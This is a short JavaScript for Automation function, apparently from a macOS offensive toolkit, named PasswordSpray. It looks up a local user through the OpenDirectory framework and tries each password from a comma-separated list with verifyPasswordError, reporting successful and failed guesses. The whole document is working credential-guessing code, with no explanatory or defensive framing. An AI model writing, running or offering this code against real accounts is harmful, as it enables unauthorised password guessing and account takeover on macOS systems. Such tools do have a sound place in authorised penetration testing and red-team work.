function PasswordSpray(account, creds) {
    ObjC.import("OpenDirectory");
    var session = $.ODSession.defaultSession;
    var sessionType = 0x2201 // $.kODNodeTypeAuthentication
    var recType = $.kODRecordTypeUsers
    var node = $.ODNode.nodeWithSessionTypeError(session, sessionType, $());
    var output = ""
    var results = []
    var user = node.recordWithRecordTypeNameAttributesError(recType, $(account), $(), $())
    try {
        var passwords = creds.split(",")
        for (var key in passwords) {
            if (user.js !== undefined) {
                if (user.verifyPasswordError($(passwords[key]), $())) {
                    output += "Successful authentication as: " + account + " : " + passwords[key] + "\n"
                } else {
                    output += "Failed authentication as: " + account + " : " + passwords[key] + "\n"
                }
            } else {
                output += "User " + account + " does not exist"
                break;
            }
        }
    } catch (error) {
        output += error.toString()
    }
    return output
}
